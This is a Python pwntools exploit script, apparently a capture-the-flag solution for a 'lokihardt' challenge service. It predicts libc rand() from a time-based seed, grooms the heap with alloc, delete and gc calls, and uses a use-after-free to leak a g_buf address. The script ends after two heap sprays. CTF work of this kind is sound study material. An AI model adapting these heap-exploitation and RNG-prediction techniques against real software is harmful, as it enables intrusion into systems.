#!/usr/bin/python
from pwn import *
import random
from ctypes import *
from sys import exit 
from time import sleep 
#random.seed(datetime.now())

# this code is unclean and hard to read. sorry :< 

cdll.LoadLibrary ("libc.so.6")
libc = CDLL ("libc.so.6")

#r = process ("./lokihardt")
r = remote ("0", 9027)
libc.srand (libc.time(0))

sleep (0.5)
no_use = ''

rl = []

def do_alloc (idx):
	#r.recvuntil ("> ")
	r.sendline ("1")
	r.sendline (str (idx))
	
def do_del (idx):
	#r.recvuntil ("> ")
	r.sendline ("2")
	r.sendline (str (idx))
def do_gc ():
	#r.recvuntil ("> ")
	r.sendline ("4")

def do_use (idx):
	#r.recvuntil ("> ")
	r.sendline ("3")
	r.sendline (str (idx))

def do_spray ():
	#r.recvuntil ("> ")
	r.sendline ("5")
	r.sendline ("A"*255)
	r.sendline ("B"*15)

def do_rand ():
	return  (libc.abs ((libc.rand () * 1337) % 1024) - 1 - 8)  / 16 + 1
cr = 0

def do_suck (idx, rd, wd):
	do_alloc (idx)
	r.sendline (rd)
	r.sendline (wd)
	do_del (idx)
	do_gc ()
	

for x in xrange (3000):
	rl.append (do_rand())

log.info ("get g_buf leak")

idx = 0
ptr = 0

a = rl[0] 
if a >62 or a < 11:
	exit ("bye")
do_alloc (2)
r.sendline ("A"*255)
r.sendline ("read\x00"*3)
do_alloc (0)
do_del (0)
do_del (1)
do_gc ()

idx += 1
ptr += 1
while True:
	b = rl [idx] 
	c = rl [idx+1]
	if b == a+1: #and libc.abs(dum - a) > 15 and libc.abs(dum - dum2) < 15:
		if a-c >5 and a-c <10:
			#print dum, dum2, a, b, c
			break
	idx += 1 
#      c  - a - b

for x in range (ptr, idx):

	do_alloc (0)
	r.sendline ("A"*255)
	r.sendline ("read\x00"*3)
	do_del (0)
	do_gc ()
ptr = idx	

log.info ("leak ready")


#do_suck (1, "B"*255, "read\x00"*3)

#do_suck (1, "B"*255, "read\x00"*3)

do_alloc (4)
r.sendline ("A"*255)
r.sendline ("read\x00"*3)
do_del (1)
do_gc ()

do_alloc (0)
r.sendline ("A"*255)
r.sendline ("read\x00"*3)
do_del (1)
do_gc ()

idx += 2
ptr = idx

r.sendline ("3\n17")
r.recvuntil ("runtime error")
r.sendline ("3\n2")
r.recvuntil ("idx?")
leak = r.recvuntil ("- menu -").split ("- menu -")[0]

leak = leak.split ("\x0a")[1][0:8]
g_buf = ""
for c in leak[::-1]:
	g_buf += c.encode ('hex') 

g_buf = int (g_buf,16)
log.info ("g_buf leak: "+ hex(g_buf))

#do_del (-2)
do_spray ()
do_spray ()

#  
